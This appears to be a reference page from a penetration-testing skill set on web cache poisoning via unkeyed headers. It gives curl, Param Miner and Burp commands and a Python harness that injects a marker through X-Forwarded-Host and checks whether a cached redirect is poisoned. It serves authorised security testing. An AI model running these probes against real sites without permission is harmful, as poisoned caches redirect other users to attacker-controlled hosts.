# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`web-cache-poisoning-and-deception-unkeyed-input`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -D - -o /dev/null 'https://target.example/go?cb=uki-aaaa' -H 'X-Forwarded-Host: uki-marker.example'` | Inject a benign marker through the suspected unkeyed header and read the Location and cache headers | Cross-platform |
| `curl` | `curl -sS -D - -o /dev/null 'https://target.example/go?cb=uki-aaaa'` | Issue the clean follow-up to the busted URL to see whether the marker was stored | Cross-platform |
| `Param Miner (Burp)` | `Run 'Guess headers' and 'Guess GET parameters' against the URL` | Enumerate unkeyed headers and parameters the origin reflects into the response | Cross-platform |
| `Burp Suite Repeater` | `Alternate header-carrying and clean requests on the busted URL, watching X-Cache and Age` | Confirm the reflected marker persists to clean requests | Cross-platform |

## Minimal Script Shape

An inject-then-clean harness for a forwarded header: it reads the Location of a busted redirect URL after injecting a marker, then without it, and reports whether the marker persisted in cache.

```python
import urllib.request
import urllib.error

URL = 'https://target.example/go?cb=uki-aaaa'
MARKER = 'uki-marker.example'

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

def fetch(headers):
    opener = urllib.request.build_opener(NoRedirect)
    req = urllib.request.Request(URL, headers=headers)
    try:
        with opener.open(req, timeout=10) as resp:
            return resp.headers.get('Location', ''), resp.headers.get('X-Cache', '')
    except urllib.error.HTTPError as exc:
        return exc.headers.get('Location', ''), exc.headers.get('X-Cache', '')

inject = fetch({'X-Forwarded-Host': MARKER, 'User-Agent': 'authorised-assessment'})
clean = fetch({'User-Agent': 'authorised-assessment'})
print({'inject': inject, 'clean': clean, 'poisoned': MARKER in clean[0]})
```
